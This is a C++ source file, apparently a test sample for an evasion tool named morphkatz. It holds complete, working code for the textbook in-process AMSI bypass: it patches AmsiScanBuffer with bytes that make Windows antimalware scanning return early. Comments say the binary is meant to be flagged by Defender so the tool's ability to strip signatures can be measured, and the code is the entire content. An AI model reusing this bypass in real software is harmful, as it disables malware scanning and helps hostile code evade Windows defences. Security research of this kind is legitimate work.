// amsi_patch_demo.cpp - controlled, intentionally Defender-flagged test PE.
//
// Educational sample. We deliberately implement the textbook
// in-process AMSI bypass technique so that Microsoft Defender's static
// scanner classifies the resulting binary, and we can use it to validate
// what morphkatz can and cannot evade.
//
// At runtime, the patch IS applied; behaviour is harmless beyond that
// (we just print and exit). The patch bytes write
//   mov eax, 0x80070057   ; E_INVALIDARG
//   ret
// to the start of AmsiScanBuffer, which causes AMSI to treat all future
// scans in this process as "not scanned" until the process exits.
//
// The detectable surfaces in this binary are:
//   .text:   the LoadLibraryA + GetProcAddress + VirtualProtect +
//            memcpy(patch, 6) call sequence  -> code-pattern signature.
//   .rdata:  the literal strings "amsi.dll" and "AmsiScanBuffer", plus
//            the 6-byte patch as a const array  -> string / byte-sequence
//            signatures.
//
// We keep both surfaces visible so we can demonstrate which signatures
// morphkatz removes and which it cannot (instruction-level rewriting
// helps with the .text surface; .rdata strings are out of scope).

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <cstdio>
#include <cstring>

namespace {

// 6-byte patch: mov eax, 0x80070057 ; ret  (E_INVALIDARG -> AMSI bails)
const unsigned char kAmsiPatch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};

int patch_amsi_scan_buffer() {
    HMODULE amsi = ::LoadLibraryA("amsi.dll");
    if (!amsi) {
        std::printf("LoadLibraryA(\"amsi.dll\") failed: %lu\n",
                    ::GetLastError());
        return 1;
    }

    FARPROC scan_buffer = ::GetProcAddress(amsi, "AmsiScanBuffer");
    if (!scan_buffer) {
        std::printf("GetProcAddress(\"AmsiScanBuffer\") failed: %lu\n",
                    ::GetLastError());
        return 2;
    }

    DWORD old_protect = 0;
    if (!::VirtualProtect(scan_buffer, sizeof(kAmsiPatch),
                          PAGE_EXECUTE_READWRITE, &old_protect)) {
        std::printf("VirtualProtect(rwx) failed: %lu\n", ::GetLastError());
        return 3;
    }

    std::memcpy(reinterpret_cast<void*>(scan_buffer),
                kAmsiPatch, sizeof(kAmsiPatch));

    DWORD restore = 0;
    ::VirtualProtect(scan_buffer, sizeof(kAmsiPatch),
                     old_protect, &restore);

    std::printf("Patched AmsiScanBuffer at %p with %zu bytes.\n",
                reinterpret_cast<void*>(scan_buffer),
                sizeof(kAmsiPatch));
    return 0;
}

}  // namespace

int main() {
    int rc = patch_amsi_scan_buffer();
    std::printf("amsi_patch_demo: rc=%d (educational sample)\n", rc);
    return rc;
}
